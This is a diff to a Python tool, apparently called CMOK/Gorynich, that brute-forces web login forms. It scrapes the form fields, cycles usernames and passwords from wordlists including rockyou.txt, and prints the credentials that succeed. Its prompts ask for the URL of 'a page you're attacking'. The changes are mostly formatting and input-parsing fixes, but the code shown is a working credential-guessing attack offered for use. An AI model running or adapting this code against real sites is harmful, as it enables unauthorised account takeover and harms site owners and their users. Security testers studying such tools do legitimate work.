@@ -20,8 +20,10 @@ print_horizontal_delimiter()
 mode_input = int(input("# Step 1: Select mode\n"
                        "# You want to attack ONE specific username - type 1\n"
                        "# You don't know a specific username to attack - type 2\n"))
+
+
 def find_authentication_form(url, cookies=None):
-    response = requests.get(url, cookies = {'Cookie': cookies})
+    response = requests.get(url, cookies={'Cookie': cookies})
     soup = BeautifulSoup(response.content, "html.parser")
     form = None
     for input_field in soup.find_all("input"):
@@ -47,14 +49,15 @@ def forge_payload(inputs, username, password):
 
 def attempt_login(url, method, payload, cookies=None):
     if method == "post":
-        response = requests.post(url, data=payload, cookies = {'Cookie': cookies})
+        response = requests.post(url, data=payload, cookies={'Cookie': cookies})
     else:
-        response = requests.get(url, params=payload, cookies = {'Cookie': cookies})
+        response = requests.get(url, params=payload, cookies={'Cookie': cookies})
     return response
 
 
 def read_file_as_list(filename):
-    file = open(str(f"{os.path.dirname(os.path.abspath(__file__))}{filename}"), "r")
+    file = open(str(f"{os.path.dirname(os.path.abspath(__file__))}{filename}"),
+                encoding="utf8", errors='ignore', mode="r")
     li = file.readlines()
     file.close()
     return li
@@ -74,12 +77,14 @@ def bruteforce_username(username, passwd_list, url, method, inputs, cookies, fai
                 suspicious_success_content_len = response.content.__len__()
                 continue
             if suspicious_success and suspicious_success_content_len == response.content.__len__():
-                print(colored("[!] It seems like your input parameters are incorrect, because all username-password pairs seem valid\n"
-                              "    Please re-check your input parameters, try to provide cookies also", "magenta"))
+                print(colored(
+                    "[!] It seems like your input parameters are incorrect, because all username-password pairs seem valid\n"
+                    "    Please re-check your input parameters, try to provide cookies also", "magenta"))
                 quit()
             print(colored(f"[+] SUCCESS Username {username} - Password {password}", "green"))
             return username, password
     return None
+
 
 def collect_input_parameters(skip_username=False):
     url = input("# Step 2: Copy and paste URL of a page you're attacking\n")
@@ -90,8 +95,10 @@ def collect_input_parameters(skip_username=False):
     fail_label = input("# Step 4: Type in a label or its part that appears when a login is failed\n"
                        "# ex. Login attempt is unsuccessful, please try again\n")
     form = find_authentication_form(url, cookies)
-    rockyou = input("# EXTRA: Do you want to use " + colored("rockyou", "magenta") + " wordlist instead of a normal one?\n"
-                    "# WARNING! Using " + colored("rockyou", "magenta") + " will lead to a very long program run time!!\n")
+    rockyou = input("# EXTRA: Do you want to use " + colored("rockyou",
+                                                             "magenta") + " wordlist instead of a normal one? (type y/n)\n"
+                                                                          "# WARNING! Using " + colored("rockyou",
+                                                                                                        "magenta") + " will lead to a very long program run time!!\n")
     if not skip_username:
         username = input("# Step 5: Type username to attack\n")
         return username, url, cookies, fail_label, form, rockyou
@@ -107,7 +114,7 @@ def run_cmok():
         print("# Starting CMOK attack!\n"
               "# Using @wpxmlrpcbrute enhanced common password wordlist\n")
         print_cmok()
-        if rockyou:
+        if not 'n' in rockyou:
             passwd_list = read_file_as_list("/wordlists/rockyou.txt")
         else:
             passwd_list = read_file_as_list("/wordlists/passwords.txt")
@@ -125,9 +132,11 @@ def run_cmok():
 
 def bruteforce_usernames(usrnms_list, passwd_list, url, method, inputs, cookies, fail_label):
     for username in usrnms_list:
-        res_un, res_pass = bruteforce_username(username, passwd_list, url, method, inputs, cookies, fail_label) or (None, None)
+        res_un, res_pass = bruteforce_username(username, passwd_list, url, method, inputs, cookies, fail_label) or (
+            None, None)
         if res_un and res_pass:
             return res_un, res_pass
+
 
 def run_gorinych():
     print_horizontal_delimiter()
@@ -140,12 +149,13 @@ def run_gorinych():
               "# Using @jeanphorn common username wordlist\n")
         print_gorynich()
         usrnms_list = read_file_as_list("/wordlists/usernames.txt")
-        if rockyou:
+        if not 'n' in rockyou:
             passwd_list = read_file_as_list("/wordlists/rockyou.txt")
         else:
             passwd_list = read_file_as_list("/wordlists/passwords.txt")
         action, method, inputs = form
-        res_un, res_pass = bruteforce_usernames(usrnms_list, passwd_list, url, method, inputs, cookies, fail_label) or (None, None)
+        res_un, res_pass = bruteforce_usernames(usrnms_list, passwd_list, url, method, inputs, cookies, fail_label) or (
+            None, None)
         if res_un and res_pass:
             print(f"# Successful bruteforce, found valid credentials Username "
                   + colored(res_un, "green") + " - Password " + colored(res_pass, "green"))
